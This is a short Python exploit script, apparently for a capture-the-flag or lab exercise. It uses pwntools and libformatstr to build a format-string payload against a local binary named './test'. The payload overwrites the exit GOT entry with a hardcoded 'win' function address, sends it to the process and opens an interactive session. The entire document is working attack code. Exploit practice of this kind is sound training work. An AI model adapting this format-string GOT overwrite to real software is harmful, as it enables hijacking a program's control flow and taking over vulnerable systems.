from libformatstr import *
from pwn import *
from binascii import *
context.log_level = 'debug'
bufsiz = 100
#r = process('./print_test')
elf=ELF('./test')
exit_got=0x0002ff70
win_addr=0x565fb5fd
bufsiz = 100
r = process('./test')
p = FormatStr()
p[exit_got] = win_addr
buf = p.payload(10,3)
r.sendline(buf)
r.interactive()